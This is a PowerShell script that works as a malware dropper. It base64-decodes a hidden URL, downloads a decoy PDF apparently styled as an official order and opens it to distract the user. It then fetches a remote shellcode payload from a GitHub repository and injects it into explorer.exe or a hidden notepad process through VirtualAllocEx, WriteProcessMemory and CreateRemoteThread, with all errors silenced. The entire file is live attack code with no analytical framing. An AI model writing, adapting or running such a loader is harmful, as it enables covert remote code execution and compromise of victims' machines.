$ErrorActionPreference = 'SilentlyContinue'

$pdfUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9OYWthel9Oby5fNjYxX3ZpZF8wMi4wMy4yMDI2LnBkZg=='))
$pdfPath = "$env:TEMP\nakaz.pdf"
Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing
Start-Process $pdfPath

$shellcodeUrl = "https://github.com/astro-opensource/cloud-sync-tools/raw/refs/heads/main/assets/payload.bin"

$shellcode = (Invoke-WebRequest -Uri $shellcodeUrl -Headers @{'User-Agent'='Mozilla/5.0'} -UseBasicParsing).Content

$target = Get-Process -Name explorer -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $target) {
    $target = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
    Start-Sleep -Milliseconds 500
}

$code = @'
using System;
using System.Runtime.InteropServices;
public class Inject {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}
'@
Add-Type $code

$pid = $target.Id
$hProcess = [Inject]::OpenProcess(0x1F0FFF, $false, $pid)
if ($hProcess -ne 0) {
    $addr = [Inject]::VirtualAllocEx($hProcess, [IntPtr]::Zero, $shellcode.Length, 0x1000, 0x40)
    if ($addr -ne 0) {
        $bytesWritten = [UIntPtr]::Zero
        [Inject]::WriteProcessMemory($hProcess, $addr, $shellcode, $shellcode.Length, [ref]$bytesWritten) | Out-Null
        [Inject]::CreateRemoteThread($hProcess, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
    }
    [Inject]::CloseHandle($hProcess)
}
